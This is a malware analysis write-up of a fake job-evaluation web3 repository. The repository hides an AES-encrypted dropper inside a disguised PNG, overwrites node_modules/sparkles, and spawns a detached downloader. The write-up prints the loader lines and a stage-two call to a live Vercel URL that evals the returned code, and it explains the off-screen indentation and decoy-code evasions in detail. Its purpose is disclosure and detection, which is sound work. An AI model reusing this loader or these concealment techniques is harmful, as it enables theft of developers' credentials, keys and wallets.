# Case 2: `RWAHub` / `rwamarketplace`. The trap fires when you start the app

| | |
|---|---|
| **Delivered as** | A job "evaluation": a React + Express + Hardhat "real-world-asset tokenization marketplace" with a `Task/Task.md` and a Notion "Product Overview" page |
| **Triggered by** | `npm run dev` (the browser opens by itself), or running the bundled tests |
| **Needed clicks?** | None after starting the dev server |
| **Impact** | Starts a detached downloader that runs whatever JavaScript a Vercel endpoint returns |
| **Family** | Same campaign shape as Case 1; the downloader pattern (`eval(r.data.cookie)`) matches OtterCookie |

## What it looked like

A competent-looking web3 MVP:

- Solidity contracts (ERC-1155 marketplace, KYC registry, ERC-3643-style
  token, UUPS proxies) and a Hardhat deploy script;
- a Zustand / Tailwind / shadcn frontend and an Express API;
- plenty of security-flavored code: `timingSafeEqual`, an SSRF guard for
  webhooks, IPFS hash regexes, and a carefully hardened file-path helper.

`Task.md` asks you to install, run `npm run dev`, open the site, connect
MetaMask, and create an asset. The Notion page names no company, team or
chain; it asks developers to "assess the MVP and explain your technical
decisions".

## The trap: five steps, none of which looks like malware on its own

1. **Auto-open.** `vite.config.ts` has `server.open: true`, so starting the dev
   server opens the browser.
2. **Ordered bootstrap.** `App.tsx` mounts `BootstrapApiData`, which does
   `await fetchAssets()` and *then* `await fetchValidators()` on first load.
   The order matters.
3. **The drop** (`GET /api/assets`):
   - `db.getAllAssets()` ends with `return validateAssets(assets, this.sign)`.
   - `validateSign()` in `middleware/validation.js` reads each asset's image
     from `public/` **as raw bytes**. It takes a 4-byte length from the end of
     the file and slices out that many bytes.
   - It decrypts them with AES-256-GCM, using `sha256(asset.title)` as the
     key, and XOR-decodes a second chunk into a file path.
   - `db.sign()` then writes the decrypted bytes to
     `path.join(process.cwd(), <decoded path>)`, with **no validation**.
     Directly above it sits `_signaturePath()`, a beautifully hardened path
     checker that the drop never uses. It's a decoy for reviewers.
4. **The carrier.** `public/assets/collectibles/baseball-cards.jpg` is **a PNG
   renamed to `.jpg`**, with **1,574 bytes appended after its `IEND` chunk**:
   - a 60-byte XOR'd path, `node_modules/sparkles/index.js`;
   - a 1,506-byte AES blob.

   The decryption key is the title of the asset that uses the image:
   `First Edition "The Great Gatsby"`.
5. **The trigger** (`GET /api/validators`): the route calls `db.log()`, which
   does `require('glogg')`. `glogg` is a gulp-internal logger with no reason to
   be in an Express app; it's there because it `require`s **`sparkles`**, the
   file that step 3 just overwrote.

## The payload

The dropped `node_modules/sparkles/index.js` is the genuine `sparkles` source
with one extra line, **indented about 200 spaces so it sits off-screen** in
any editor:

```js
const{spawn}=require("child_process");const code=`try{eval(atob("…"))}catch(e){}`;
const child=spawn(process.execPath,["-e",code],{stdio:"ignore",detached:true});child.unref();
```

Base64-decoded, the stage it runs is:

```js
require('axios').get('https://db-connectors.vercel.app/server/v2', { headers: { bearrtoken: 'dbheader' } })
  .then(r => { try { eval(r.data.cookie) } catch (e) {} }).catch(e => {})
```

It's a detached background Node process that survives closing the terminal.
It fetches JavaScript from a Vercel deployment, gated on a custom header, and
runs whatever comes back in the `cookie` field. That final stage isn't in the
repo. In this campaign it is typically:
- a browser-credential, cookie and crypto-wallet stealer;
- a file stealer (`.env` files, SSH keys, source code);
- a remote-access backdoor.

The bundled tests (`tests/api.test.js`) hit `/api/assets` and then
`/api/validators`, so **"just running the tests" fires it too**.

## Why it's hard to spot

- The repo contains **no `eval` of downloaded code and no URL to the
  malware**. Everything incriminating is AES-encrypted inside an image.
- The trigger is split across two innocent-sounding requests and functions
  named `validateSign`, `sign` and `log`.
- The file type is disguised (PNG named `.jpg`), and the hidden data sits
  after the image's real end. A naive search for the JPEG end marker even
  gives a wrong offset.
- The decoy hardened path helper and the security-themed code lower a
  reviewer's guard.
- The overwritten library still works, errors are swallowed, and the process
  is detached.

## Indicators

| Type | Value |
|---|---|
| Carrier | `public/assets/collectibles/baseball-cards.jpg` (PNG; 1,574 bytes after `IEND`) |
| Key | `sha256('First Edition "The Great Gatsby"')` |
| Dropped file | `node_modules/sparkles/index.js` |
| Trigger dependency | `glogg` in `dependencies` |
| Loader code | `middleware/validation.js` (`validateSign`), `models/database.js` (`sign`, `log`) |
| Stage 2 | `https://db-connectors.vercel.app/server/v2`, header `bearrtoken: dbheader` |

## How the skill catches it

```
=== HIGH (2) ===
- public/assets/collectibles/baseball-cards.jpg
    1,574 bytes hidden after the end of the PNG data (steganography carrier) - find the code that reads this file as bytes
- src/server/models/database.js:551
    writes a file to a path built from runtime data under the working directory (dropper pattern - is the path validated?)

=== MEDIUM ===
- package.json   unusual dependency 'glogg': gulp-internal logger; loads `sparkles`, which a real dropper overwrote to gain execution
- public/assets/collectibles/baseball-cards.jpg   file named .jpg is really png - disguised file type
- src/server/middleware/validation.js:222   reads a length-prefixed blob from the END of a file (stego carrier pattern)
- src/server/middleware/validation.js:244   decrypts embedded data (check where the key and ciphertext come from)
```

From there the skill has the agent decode the blob **with its own standalone
script** (never by importing the repo's code), which reveals the drop target
and the downloader above.
